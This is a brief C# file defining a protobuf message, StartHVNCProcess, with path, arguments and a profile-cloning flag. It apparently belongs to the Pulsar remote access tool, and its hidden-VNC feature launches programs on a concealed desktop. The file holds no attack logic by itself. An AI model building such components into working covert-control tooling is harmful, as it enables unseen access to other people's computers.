using System;
using ProtoBuf;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Monitoring.HVNC
{
    [ProtoContract]
    public class StartHVNCProcess : IMessage
    {
        [ProtoMember(1)]
        public string Path { get; set; }
        [ProtoMember(2)]
        public string Arguments { get; set; }
        [ProtoMember(3)]
        public bool DontCloneProfile { get; set; }
    }
}